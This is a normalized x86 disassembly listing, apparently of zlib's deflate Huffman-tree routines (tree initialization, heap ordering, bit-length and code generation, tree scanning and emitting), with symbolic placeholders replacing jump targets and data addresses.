lea edx [ eax + rw-data ]
mov [ esp + 0x2c ] edx
mov ecx [ esp + 0x30 ]
mov eax ecx
mov [ esp + 0x28 ] eax
jmp r-xdata
sar [ esp + 0x10 ] 0x7
mov eax [ esp + 0xc ]
lea edx [ eax * 4 + rw-data ]
mov [ esp + 0x40 ] edx
mov ecx [ esp + 0xc ]
lea eax [ ecx * 4 + rw-data ]
mov [ esp + 0x34 ] eax
cmp [ esp + 0xc ] 0x1e
jge r-xdata
xor edx edx
lea ecx [ esp + 0x58 ]
mov [ esp + 0x4 ] edx
mov [ esp + 0x44 ] ecx
mov edx [ esp + 0x10 ]
mov ecx [ esp + 0x34 ]
shl edx 0x7
xor eax eax
mov [ ecx ] edx
mov [ esp ] eax
mov edx [ esp + 0x10 ]
lea ecx [ edx + rw-data ]
mov [ esp + 0x3c ] ecx
mov eax [ esp + 0x40 ]
mov edx eax
mov [ esp + 0x38 ] edx
jmp r-xdata
mov eax [ esp + 0x44 ]
mov [ eax ] 0x0
inc [ esp + 0x4 ]
add [ esp + 0x44 ] 0x2
cmp [ esp + 0x4 ] 0xf
jle r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp + 0x48 ] rw-data
mov edx [ esp + 0x38 ]
mov ecx [ edx ]
add ecx 0xfffffff9
mov eax 0x1
shl eax cl
cmp eax [ esp ]
jg r-xdata
mov ecx [ esp + 0x48 ]
mov [ ecx ] 0x8
inc [ esp ]
add [ esp + 0x48 ] 0x4
inc [ esp + 0x68 ]
cmp [ esp ] 0x8f
jle r-xdata
mov eax [ esp ]
lea edx [ eax * 4 + rw-data ]
mov [ esp + 0x4c ] edx
cmp [ esp ] 0xff
jg r-xdata
mov cl [ esp + 0xc ]
mov eax [ esp + 0x3c ]
mov [ eax ] cl
inc [ esp + 0x10 ]
inc [ esp + 0x3c ]
inc [ esp ]
inc [ esp + 0xc ]
add [ esp + 0x40 ] 0x4
add [ esp + 0x34 ] 0x4
cmp [ esp + 0xc ] 0x1e
jl r-xdata
mov eax [ esp ]
lea edx [ eax * 4 + rw-data ]
mov [ esp + 0x50 ] edx
cmp [ esp ] 0x117
jg r-xdata
mov ecx [ esp + 0x4c ]
mov [ ecx ] 0x9
inc [ esp ]
add [ esp + 0x4c ] 0x4
inc [ esp + 0x6a ]
cmp [ esp ] 0xff
jle r-xdata
mov eax [ esp ]
lea edx [ eax * 4 + rw-data ]
mov [ esp + 0x54 ] edx
cmp [ esp ] 0x11f
jg r-xdata
mov ecx [ esp + 0x50 ]
mov [ ecx ] 0x7
inc [ esp ]
add [ esp + 0x50 ] 0x4
inc [ esp + 0x66 ]
cmp [ esp ] 0x117
jle r-xdata
lea ecx [ esp + 0x58 ]
mov eax rw-data
mov edx 0x11f
call sub_465e8c
xor eax eax
mov [ esp ] eax
mov [ esp + 0x54 ] rw-data
mov ecx [ esp + 0x54 ]
mov [ ecx ] 0x8
inc [ esp ]
add [ esp + 0x54 ] 0x4
inc [ esp + 0x68 ]
cmp [ esp ] 0x11f
jle r-xdata
mov edx [ esp + 0x54 ]
mov [ edx ] 0x5
mov edx 0x5
mov eax [ esp ]
call sub_468310
mov ecx [ esp + 0x54 ]
mov [ ecx - 0x2 ] ax
inc [ esp ]
add [ esp + 0x54 ] 0x4
cmp [ esp ] 0x1e
jl r-xdata
mov [ rw-data ] 0x1
sub_465864
push ecx
mov [ esp ] eax
call sub_465560
mov eax [ esp ]
xor edx edx
mov [ eax + 0x169f ] edx
mov eax [ esp ]
mov ecx [ esp ]
add ecx 0x86
mov [ eax + 0xb0a ] ecx
mov edx [ esp ]
mov [ edx + 0xb12 ] rw-data
mov eax [ esp ]
mov ecx [ esp ]
add ecx 0x97a
mov [ eax + 0xb16 ] ecx
mov edx [ esp ]
mov [ edx + 0xb1e ] rw-data
mov eax [ esp ]
mov ecx [ esp ]
add ecx 0xa6e
mov [ eax + 0xb22 ] ecx
mov edx [ esp ]
mov [ edx + 0xb2a ] rw-data
mov ecx [ esp ]
xor edx edx
mov [ ecx + 0x16ab ] 0x0
mov eax [ esp ]
mov [ eax + 0x16ad ] edx
mov ecx [ esp ]
mov [ ecx + 0x16a7 ] 0x8
mov eax [ esp ]
call sub_465904
pop edx
retn
sub_465904
add esp 0xffffffec
mov [ esp ] eax
xor eax eax
mov [ esp + 0x4 ] eax
mov edx [ esp ]
lea ecx [ edx + 0x86 ]
mov [ esp + 0x8 ] ecx
mov eax [ esp + 0x8 ]
mov [ eax ] 0x0
inc [ esp + 0x4 ]
add [ esp + 0x8 ] 0x4
cmp [ esp + 0x4 ] 0x11e
jl r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov ecx [ esp ]
lea eax [ ecx + 0x97a ]
mov [ esp + 0xc ] eax
mov edx [ esp + 0xc ]
mov [ edx ] 0x0
inc [ esp + 0x4 ]
add [ esp + 0xc ] 0x4
cmp [ esp + 0x4 ] 0x1e
jl r-xdata
xor ecx ecx
mov [ esp + 0x4 ] ecx
mov eax [ esp ]
lea edx [ eax + 0xa6e ]
mov [ esp + 0x10 ] edx
mov ecx [ esp + 0x10 ]
mov [ ecx ] 0x0
inc [ esp + 0x4 ]
add [ esp + 0x10 ] 0x4
cmp [ esp + 0x4 ] 0x13
jl r-xdata
mov eax [ esp ]
mov [ eax + 0x486 ] 0x1
mov edx [ esp ]
xor ecx ecx
mov [ edx + 0x169b ] ecx
mov eax [ esp ]
mov [ eax + 0x1697 ] ecx
mov edx [ esp ]
xor eax eax
mov [ edx + 0x16a3 ] eax
mov edx [ esp ]
mov [ edx + 0x168f ] eax
add esp 0x14
retn
sub_4659cc
push ebx
add esp 0xffffffe4
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov eax [ esp + 0x8 ]
mov edx [ esp ]
mov ecx [ edx + eax * 4 + 0xb4e ]
mov [ esp + 0xc ] ecx
mov eax [ esp + 0x8 ]
add eax eax
mov [ esp + 0x10 ] eax
mov edx [ esp + 0xc ]
mov ecx [ esp ]
lea eax [ ecx + edx + 0x144a ]
mov [ esp + 0x18 ] eax
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
lea eax [ edx + ecx * 4 ]
mov [ esp + 0x14 ] eax
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ esp ]
cmp ecx [ eax + 0x1442 ]
jle r-xdata
mov edx [ esp + 0x10 ]
mov ecx [ esp ]
cmp edx [ ecx + 0x1442 ]
jge r-xdata
mov edx [ esp + 0x8 ]
mov ecx [ esp ]
mov eax [ esp + 0xc ]
mov [ ecx + edx * 4 + 0xb4e ] eax
add esp 0x1c
pop ebx
retn
mov edx [ esp ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x4 ]
mov eax [ edx + eax * 4 + 0xb4e ]
mov dx [ ecx + eax * 4 ]
mov ecx [ esp + 0x14 ]
cmp dx [ ecx ]
ja r-xdata
mov edx [ esp + 0x10 ]
mov ecx [ esp ]
mov eax [ esp + 0x4 ]
mov ebx [ esp ]
mov edx [ ecx + edx * 4 + 0xb52 ]
mov ecx [ esp + 0x4 ]
mov ax [ eax + edx * 4 ]
mov edx [ esp + 0x10 ]
mov edx [ ebx + edx * 4 + 0xb4e ]
cmp ax [ ecx + edx * 4 ]
jb r-xdata
mov edx [ esp + 0x10 ]
mov ecx [ esp ]
mov eax [ esp + 0x4 ]
mov edx [ ecx + edx * 4 + 0xb4e ]
mov ecx [ esp + 0x14 ]
mov ax [ eax + edx * 4 ]
cmp ax [ ecx ]
jne r-xdata
inc [ esp + 0x10 ]
mov ecx [ esp + 0x10 ]
mov edx [ esp ]
mov eax [ esp + 0x4 ]
mov ebx [ esp ]
mov ecx [ edx + ecx * 4 + 0xb52 ]
mov edx [ esp + 0x4 ]
mov ax [ eax + ecx * 4 ]
mov ecx [ esp + 0x10 ]
mov ecx [ ebx + ecx * 4 + 0xb4e ]
cmp ax [ edx + ecx * 4 ]
jne r-xdata
mov eax [ esp + 0x10 ]
mov ebx [ esp ]
mov edx [ esp + 0x8 ]
mov ecx [ esp ]
mov eax [ ebx + eax * 4 + 0xb4e ]
mov [ ecx + edx * 4 + 0xb4e ] eax
mov edx [ esp + 0x10 ]
mov [ esp + 0x8 ] edx
shl [ esp + 0x10 ] 0x1
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x10 ]
mov dl [ eax ]
mov eax [ esp ]
mov ecx [ eax + ecx * 4 + 0xb4e ]
mov eax [ esp ]
cmp dl [ eax + ecx + 0x144a ]
jbe r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp ]
mov eax [ edx + eax * 4 + 0xb52 ]
mov edx [ esp ]
mov cl [ edx + eax + 0x144a ]
mov eax [ esp + 0x10 ]
mov edx [ esp ]
mov eax [ edx + eax * 4 + 0xb4e ]
mov edx [ esp ]
cmp cl [ edx + eax + 0x144a ]
ja r-xdata
sub_465b74
add esp 0xffffffb0
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov eax [ esp + 0x4 ]
mov edx [ eax ]
mov [ esp + 0x8 ] edx
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x4 ]
mov [ esp + 0xc ] eax
mov edx [ esp + 0x4 ]
mov ecx [ edx + 0x8 ]
mov eax [ ecx ]
mov [ esp + 0x10 ] eax
mov edx [ esp + 0x4 ]
mov ecx [ edx + 0x8 ]
mov eax [ ecx + 0x4 ]
mov [ esp + 0x14 ] eax
mov edx [ esp + 0x4 ]
mov ecx [ edx + 0x8 ]
mov eax [ ecx + 0x8 ]
mov [ esp + 0x18 ] eax
mov edx [ esp + 0x4 ]
mov ecx [ edx + 0x8 ]
xor edx edx
mov eax [ ecx + 0x10 ]
xor ecx ecx
mov [ esp + 0x1c ] eax
mov [ esp + 0x38 ] edx
mov [ esp + 0x2c ] ecx
mov eax [ esp ]
lea edx [ eax + 0xb2e ]
mov [ esp + 0x3c ] edx
mov ecx [ esp + 0x3c ]
mov [ ecx ] 0x0
inc [ esp + 0x2c ]
add [ esp + 0x3c ] 0x2
cmp [ esp + 0x2c ] 0xf
jle r-xdata
mov eax [ esp ]
mov edx [ eax + 0x1446 ]
mov ecx [ esp ]
mov eax [ ecx + edx * 4 + 0xb4e ]
mov edx [ esp + 0x8 ]
mov [ edx + eax * 4 + 0x2 ] 0x0
mov ecx [ esp ]
mov eax [ ecx + 0x1446 ]
inc eax
mov [ esp + 0x20 ] eax
mov edx [ esp ]
mov ecx [ esp + 0x20 ]
lea eax [ edx + ecx * 4 + 0xb4e ]
mov [ esp + 0x40 ] eax
cmp [ esp + 0x20 ] 0x23d
jge r-xdata
cmp [ esp + 0x38 ] 0x0
je r-xdata
mov edx [ esp + 0x40 ]
mov ecx [ edx ]
mov [ esp + 0x24 ] ecx
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x24 ]
movzx ecx [ eax + edx * 4 + 0x2 ]
mov eax [ esp + 0x8 ]
movzx edx [ eax + ecx * 4 + 0x2 ]
inc edx
mov [ esp + 0x2c ] edx
mov ecx [ esp + 0x2c ]
cmp ecx [ esp + 0x1c ]
jle r-xdata
add esp 0x50
retn
mov ecx [ esp + 0x1c ]
dec ecx
mov [ esp + 0x2c ] ecx
mov eax [ esp ]
mov edx [ esp + 0x2c ]
lea ecx [ eax + edx * 2 + 0xb2e ]
mov [ esp + 0x44 ] ecx
jmp r-xdata
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0x24 ]
mov ax [ esp + 0x2c ]
mov [ edx + ecx * 4 + 0x2 ] ax
mov edx [ esp + 0x24 ]
cmp edx [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x1c ]
mov [ esp + 0x2c ] eax
inc [ esp + 0x38 ]
mov eax [ esp + 0x44 ]
cmp [ eax ] 0x0
je r-xdata
inc [ esp + 0x20 ]
add [ esp + 0x40 ] 0x4
cmp [ esp + 0x20 ] 0x23d
jl r-xdata
mov ecx [ esp ]
mov eax [ esp + 0x2c ]
xor edx edx
inc [ ecx + eax * 2 + 0xb2e ]
mov [ esp + 0x30 ] edx
mov ecx [ esp + 0x24 ]
cmp ecx [ esp + 0x18 ]
jl r-xdata
dec [ esp + 0x2c ]
add [ esp + 0x44 ] 0xfffffffe
mov edx [ esp ]
mov ecx [ esp + 0x2c ]
dec [ edx + ecx * 2 + 0xb2e ]
mov eax [ esp ]
mov edx [ esp + 0x2c ]
add [ eax + edx * 2 + 0xb30 ] 0x2
mov ecx [ esp ]
mov eax [ esp + 0x1c ]
dec [ ecx + eax * 2 + 0xb2e ]
sub [ esp + 0x38 ] 0x2
cmp [ esp + 0x38 ] 0x0
jg r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x24 ]
mov cx [ eax + edx * 4 ]
mov [ esp + 0x34 ] cx
movzx eax [ esp + 0x34 ]
mov edx [ esp + 0x2c ]
mov ecx [ esp ]
add edx [ esp + 0x30 ]
imul edx
add [ ecx + 0x1697 ] eax
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov eax [ esp + 0x24 ]
sub eax [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov ecx [ edx + eax * 4 ]
mov [ esp + 0x30 ] ecx
mov edx [ esp + 0x1c ]
mov [ esp + 0x2c ] edx
mov ecx [ esp ]
mov eax [ esp + 0x2c ]
lea edx [ ecx + eax * 2 + 0xb2e ]
mov [ esp + 0x48 ] edx
cmp [ esp + 0x2c ] 0x0
je r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x24 ]
movzx ecx [ eax + edx * 4 + 0x2 ]
add ecx [ esp + 0x30 ]
movzx eax [ esp + 0x34 ]
imul ecx eax
mov edx [ esp ]
add [ edx + 0x169b ] ecx
mov ecx [ esp + 0x48 ]
movzx eax [ ecx ]
mov [ esp + 0x24 ] eax
dec [ esp + 0x2c ]
add [ esp + 0x48 ] 0xfffffffe
cmp [ esp + 0x2c ] 0x0
jne r-xdata
dec [ esp + 0x20 ]
add [ esp + 0x4c ] 0xfffffffc
mov edx [ esp + 0x4c ]
mov ecx [ edx ]
mov [ esp + 0x28 ] ecx
mov eax [ esp + 0x28 ]
cmp eax [ esp + 0xc ]
jg r-xdata
mov edx [ esp ]
mov ecx [ esp + 0x20 ]
lea eax [ edx + ecx * 4 + 0xb4e ]
mov [ esp + 0x4c ] eax
cmp [ esp + 0x24 ] 0x0
je r-xdata
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0x28 ]
movzx eax [ edx + ecx * 4 + 0x2 ]
cmp eax [ esp + 0x2c ]
je r-xdata
dec [ esp + 0x24 ]
cmp [ esp + 0x24 ] 0x0
jne r-xdata
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0x28 ]
movzx eax [ edx + ecx * 4 + 0x2 ]
mov edx [ esp + 0x2c ]
sub edx eax
mov ecx [ esp + 0x8 ]
mov eax [ esp + 0x28 ]
movzx ecx [ ecx + eax * 4 ]
imul edx ecx
mov eax [ esp ]
add [ eax + 0x1697 ] edx
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0x28 ]
mov ax [ esp + 0x2c ]
mov [ edx + ecx * 4 + 0x2 ] ax
sub_465e8c
add esp 0xffffffb8
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
lea eax [ esp + 0x2a ]
mov [ esp + 0xc ] 0x0
mov [ esp + 0x10 ] 0x1
mov [ esp + 0x20 ] eax
mov edx [ esp + 0x8 ]
mov ecx edx
mov [ esp + 0x1c ] ecx
mov eax [ esp + 0x1c ]
mov dx [ eax ]
add dx [ esp + 0xc ]
add edx edx
mov [ esp + 0xc ] dx
mov eax [ esp + 0x20 ]
mov [ eax ] dx
inc [ esp + 0x10 ]
add [ esp + 0x20 ] 0x2
add [ esp + 0x1c ] 0x2
cmp [ esp + 0x10 ] 0xf
jle r-xdata
xor ecx ecx
mov [ esp + 0x14 ] ecx
mov eax [ esp ]
lea edx [ eax + 0x2 ]
mov [ esp + 0x24 ] edx
mov ecx [ esp + 0x14 ]
cmp ecx [ esp + 0x4 ]
jg r-xdata
add esp 0x48
retn
mov eax [ esp + 0x24 ]
movzx edx [ eax ]
mov [ esp + 0x18 ] edx
cmp [ esp + 0x18 ] 0x0
je r-xdata
inc [ esp + 0x14 ]
add [ esp + 0x24 ] 0x4
mov eax [ esp + 0x14 ]
cmp eax [ esp + 0x4 ]
jle r-xdata
mov ecx [ esp + 0x18 ]
mov ax [ esp + ecx * 2 + 0x28 ]
inc [ esp + ecx * 2 + 0x28 ]
movzx eax ax
mov edx [ esp + 0x18 ]
call sub_468310
mov ecx [ esp + 0x24 ]
mov [ ecx - 0x2 ] ax
sub_465f50
add esp 0xffffffd4
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov eax [ esp + 0x4 ]
mov edx [ eax ]
mov [ esp + 0x8 ] edx
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x8 ]
mov edx [ eax ]
mov [ esp + 0xc ] edx
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x8 ]
mov edx [ eax + 0xc ]
xor eax eax
mov [ esp + 0x10 ] edx
mov [ esp + 0x1c ] 0xffffffff
mov ecx [ esp ]
mov [ ecx + 0x1442 ] eax
xor ecx ecx
mov edx [ esp ]
mov [ edx + 0x1446 ] 0x23d
mov [ esp + 0x14 ] ecx
mov eax [ esp ]
lea edx [ eax + 0x144a ]
mov [ esp + 0x28 ] edx
mov ecx [ esp + 0x8 ]
mov eax ecx
mov [ esp + 0x24 ] eax
mov edx [ esp + 0x14 ]
cmp edx [ esp + 0x10 ]
jge r-xdata
mov ecx [ esp ]
cmp [ ecx + 0x1442 ] 0x2
jl r-xdata
mov ecx [ esp + 0x24 ]
cmp [ ecx ] 0x0
je r-xdata
cmp [ esp + 0x1c ] 0x2
jge r-xdata
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x1c ]
mov [ eax + 0x4 ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x1442 ]
sar eax 0x1
jns r-xdata
mov ecx [ esp + 0x24 ]
mov [ ecx + 0x2 ] 0x0
mov eax [ esp + 0x14 ]
mov [ esp + 0x1c ] eax
mov edx [ esp ]
inc [ edx + 0x1442 ]
mov ecx [ edx + 0x1442 ]
mov edx [ esp ]
mov [ edx + ecx * 4 + 0xb4e ] eax
mov eax [ esp + 0x28 ]
mov [ eax ] 0x0
jmp r-xdata
xor edx edx
inc [ esp + 0x1c ]
mov edx [ esp + 0x1c ]
jmp r-xdata
mov [ esp + 0x14 ] eax
cmp [ esp + 0x14 ] 0x1
jl r-xdata
adc eax 0x0
jmp r-xdata
inc [ esp + 0x14 ]
inc [ esp + 0x28 ]
add [ esp + 0x24 ] 0x4
mov eax [ esp + 0x14 ]
cmp eax [ esp + 0x10 ]
jl r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x20 ]
movzx eax [ edx + ecx * 4 + 0x2 ]
mov edx [ esp ]
sub [ edx + 0x169b ] eax
mov eax [ esp ]
inc [ eax + 0x1442 ]
mov ecx [ eax + 0x1442 ]
mov eax [ esp ]
mov [ eax + ecx * 4 + 0xb4e ] edx
mov [ esp + 0x20 ] edx
mov ecx [ esp + 0x8 ]
mov eax [ esp + 0x20 ]
mov [ ecx + eax * 4 ] 0x1
mov edx [ esp + 0x20 ]
mov ecx [ esp ]
mov [ ecx + edx + 0x144a ] 0x0
mov eax [ esp ]
dec [ eax + 0x1697 ]
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx [ esp + 0x10 ]
mov [ esp + 0x20 ] edx
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_4659cc
dec [ esp + 0x14 ]
cmp [ esp + 0x14 ] 0x1
jge r-xdata
mov edx [ esp + 0x18 ]
mov ecx [ esp ]
mov al [ ecx + edx + 0x144a ]
mov eax [ esp + 0x14 ]
mov ecx [ esp ]
mov al [ ecx + eax + 0x144a ]
jmp r-xdata
mov ecx [ esp ]
mov eax [ ecx + 0xb52 ]
mov [ esp + 0x14 ] eax
mov edx [ esp ]
mov ecx [ edx + 0x1442 ]
add [ edx + 0x1442 ] 0xffffffff
mov eax [ esp ]
mov edx [ eax + ecx * 4 + 0xb4e ]
mov ecx [ esp ]
mov [ ecx + 0xb52 ] edx
mov ecx 0x1
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_4659cc
mov eax [ esp ]
mov edx [ eax + 0xb52 ]
mov [ esp + 0x18 ] edx
mov ecx [ esp ]
dec [ ecx + 0x1446 ]
mov eax [ ecx + 0x1446 ]
mov edx [ esp ]
mov ecx [ esp + 0x14 ]
mov [ edx + eax * 4 + 0xb4e ] ecx
mov eax [ esp ]
dec [ eax + 0x1446 ]
mov edx [ eax + 0x1446 ]
mov ecx [ esp ]
mov eax [ esp + 0x18 ]
mov [ ecx + edx * 4 + 0xb4e ] eax
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0x18 ]
mov ax [ edx + ecx * 4 ]
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0x14 ]
add ax [ edx + ecx * 4 ]
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0x20 ]
mov [ edx + ecx * 4 ] ax
mov eax [ esp + 0x18 ]
mov edx [ esp ]
mov al [ edx + eax + 0x144a ]
mov ecx [ esp + 0x14 ]
mov edx [ esp ]
cmp al [ edx + ecx + 0x144a ]
ja r-xdata
mov eax [ esp ]
dec [ eax + 0x1446 ]
mov edx [ eax + 0x1446 ]
mov ecx [ esp ]
mov eax [ esp ]
mov eax [ eax + 0xb52 ]
mov [ ecx + edx * 4 + 0xb4e ] eax
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_465b74
mov ecx [ esp ]
add ecx 0xb2e
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x8 ]
call sub_465e8c
add esp 0x2c
retn
inc eax
mov edx [ esp + 0x20 ]
mov ecx [ esp ]
mov [ ecx + edx + 0x144a ] al
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x18 ]
mov cx [ esp + 0x20 ]
mov [ eax + edx * 4 + 0x2 ] cx
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x14 ]
mov [ eax + edx * 4 + 0x2 ] cx
mov eax [ esp + 0x20 ]
mov edx [ esp ]
mov [ edx + 0xb52 ] eax
inc [ esp + 0x20 ]
mov ecx 0x1
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_4659cc
mov ecx [ esp ]
cmp [ ecx + 0x1442 ] 0x2
jge r-xdata
sub_46627c
add esp 0xffffffd4
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ecx ecx
mov [ esp + 0x10 ] 0xffffffff
mov eax [ esp + 0x4 ]
movzx edx [ eax + 0x2 ]
mov [ esp + 0x18 ] edx
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] 0x7
mov [ esp + 0x24 ] 0x4
cmp [ esp + 0x18 ] 0x0
jne r-xdata
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
xor ecx ecx
mov [ eax + edx * 4 + 0x6 ] 0xffff
mov [ esp + 0xc ] ecx
mov eax [ esp + 0x4 ]
lea edx [ eax + 0x6 ]
mov [ esp + 0x28 ] edx
mov ecx [ esp + 0xc ]
cmp ecx [ esp + 0x8 ]
jg r-xdata
mov [ esp + 0x20 ] 0x8a
mov [ esp + 0x24 ] 0x3
add esp 0x2c
retn
mov eax [ esp + 0x18 ]
mov [ esp + 0x14 ] eax
mov edx [ esp + 0x28 ]
movzx ecx [ edx ]
mov [ esp + 0x18 ] ecx
inc [ esp + 0x1c ]
mov eax [ esp + 0x1c ]
cmp eax [ esp + 0x20 ]
jge r-xdata
mov ecx [ esp + 0x1c ]
cmp ecx [ esp + 0x24 ]
jge r-xdata
mov edx [ esp + 0x14 ]
cmp edx [ esp + 0x18 ]
je r-xdata
cmp [ esp + 0x14 ] 0x0
je r-xdata
mov eax [ esp ]
mov edx [ esp + 0x14 ]
mov cx [ esp + 0x1c ]
add [ eax + edx * 4 + 0xa6e ] cx
jmp r-xdata
inc [ esp + 0xc ]
add [ esp + 0x28 ] 0x4
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x8 ]
jle r-xdata
cmp [ esp + 0x1c ] 0xa
jg r-xdata
mov eax [ esp + 0x14 ]
cmp eax [ esp + 0x10 ]
je r-xdata
xor eax eax
mov [ esp + 0x1c ] eax
mov edx [ esp + 0x14 ]
mov [ esp + 0x10 ] edx
cmp [ esp + 0x18 ] 0x0
jne r-xdata
mov ecx [ esp ]
inc [ ecx + 0xab6 ]
mov edx [ esp ]
inc [ edx + 0xab2 ]
jmp r-xdata
mov eax [ esp ]
inc [ eax + 0xaae ]
jmp r-xdata
mov edx [ esp ]
mov ecx [ esp + 0x14 ]
inc [ edx + ecx * 4 + 0xa6e ]
mov ecx [ esp + 0x14 ]
cmp ecx [ esp + 0x18 ]
jne r-xdata
mov [ esp + 0x20 ] 0x8a
mov [ esp + 0x24 ] 0x3
jmp r-xdata
mov [ esp + 0x20 ] 0x7
mov [ esp + 0x24 ] 0x4
mov [ esp + 0x20 ] 0x6
mov [ esp + 0x24 ] 0x3
jmp r-xdata
sub_466400
add esp 0xffffff94
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ecx ecx
mov [ esp + 0x10 ] 0xffffffff
mov eax [ esp + 0x4 ]
movzx edx [ eax + 0x2 ]
mov [ esp + 0x18 ] edx
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] 0x7
mov [ esp + 0x24 ] 0x4
cmp [ esp + 0x18 ] 0x0
jne r-xdata
xor eax eax
mov [ esp + 0xc ] eax
mov edx [ esp + 0x4 ]
lea ecx [ edx + 0x6 ]
mov [ esp + 0x68 ] ecx
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x8 ]
jg r-xdata
mov [ esp + 0x20 ] 0x8a
mov [ esp + 0x24 ] 0x3
add esp 0x6c
retn
mov edx [ esp + 0x18 ]
mov [ esp + 0x14 ] edx
mov ecx [ esp + 0x68 ]
movzx eax [ ecx ]
mov [ esp + 0x18 ] eax
inc [ esp + 0x1c ]
mov edx [ esp + 0x1c ]
cmp edx [ esp + 0x20 ]
jge r-xdata
mov eax [ esp + 0x1c ]
cmp eax [ esp + 0x24 ]
jge r-xdata
mov ecx [ esp + 0x14 ]
cmp ecx [ esp + 0x18 ]
je r-xdata
cmp [ esp + 0x14 ] 0x0
je r-xdata
mov edx [ esp + 0x14 ]
mov ecx [ esp ]
movzx eax [ ecx + edx * 4 + 0xa70 ]
mov [ esp + 0x28 ] eax
mov edx 0x10
sub edx [ esp + 0x28 ]
mov ecx [ esp ]
cmp edx [ ecx + 0x16ad ]
jge r-xdata
inc [ esp + 0xc ]
add [ esp + 0x68 ] 0x4
mov ecx [ esp + 0xc ]
cmp ecx [ esp + 0x8 ]
jle r-xdata
cmp [ esp + 0x1c ] 0xa
jg r-xdata
mov edx [ esp + 0x14 ]
cmp edx [ esp + 0x10 ]
je r-xdata
mov eax [ esp + 0x14 ]
mov edx [ esp ]
mov ecx [ esp ]
mov ax [ edx + eax * 4 + 0xa6e ]
mov edx [ esp ]
mov ecx [ ecx + 0x16ad ]
shl ax cl
or [ edx + 0x16ab ] ax
mov eax [ esp ]
mov ecx [ esp + 0x28 ]
add [ eax + 0x16ad ] ecx
mov edx [ esp ]
mov eax [ esp + 0x14 ]
movzx ecx [ edx + eax * 4 + 0xa6e ]
mov [ esp + 0x2c ] ecx
mov dx [ esp + 0x2c ]
mov eax [ esp ]
mov ecx [ eax + 0x16ad ]
mov eax [ esp ]
shl dx cl
or [ eax + 0x16ab ] dx
mov edx [ esp ]
mov ecx [ edx + 0x10 ]
inc [ edx + 0x10 ]
mov eax [ esp ]
mov edx [ eax + 0x8 ]
mov eax [ esp ]
mov al [ eax + 0x16ab ]
and al 0xff
mov [ edx + ecx ] al
mov edx [ esp ]
mov ecx [ edx + 0x10 ]
inc [ edx + 0x10 ]
mov eax [ esp ]
mov edx [ eax + 0x8 ]
mov eax [ esp ]
movzx eax [ eax + 0x16ab ]
sar eax 0x8
mov [ edx + ecx ] al
mov ecx 0x10
movzx eax [ esp + 0x2c ]
mov edx [ esp ]
sub ecx [ edx + 0x16ad ]
sar eax cl
mov edx [ esp ]
mov [ edx + 0x16ab ] ax
mov eax [ esp ]
mov ecx [ esp + 0x28 ]
mov edx [ esp ]
sub ecx 0x10
add ecx [ eax + 0x16ad ]
mov [ edx + 0x16ad ] ecx
jmp r-xdata
mov ecx [ esp ]
movzx eax [ ecx + 0xab8 ]
mov [ esp + 0x58 ] eax
mov edx 0x10
sub edx [ esp + 0x58 ]
mov ecx [ esp ]
cmp edx [ ecx + 0x16ad ]
jge r-xdata
mov ecx [ esp ]
movzx eax [ ecx + 0xab4 ]
mov [ esp + 0x48 ] eax
mov edx 0x10
sub edx [ esp + 0x48 ]
mov ecx [ esp ]
cmp edx [ ecx + 0x16ad ]
jge r-xdata
mov edx [ esp ]
movzx ecx [ edx + 0xab0 ]
mov [ esp + 0x38 ] ecx
mov eax 0x10
sub eax [ esp + 0x38 ]
mov edx [ esp ]
cmp eax [ edx + 0x16ad ]
jge r-xdata
mov ecx [ esp + 0x14 ]
mov eax [ esp ]
movzx edx [ eax + ecx * 4 + 0xa70 ]
mov [ esp + 0x30 ] edx
mov ecx 0x10
sub ecx [ esp + 0x30 ]
mov eax [ esp ]
cmp ecx [ eax + 0x16ad ]
jge r-xdata
jmp r-xdata
dec [ esp + 0x1c ]
jne r-xdata
mov eax [ esp ]
mov ecx [ esp ]
mov dx [ eax + 0xab6 ]
mov ecx [ ecx + 0x16ad ]
shl dx cl
mov eax [ esp ]
or [ eax + 0x16ab ] dx
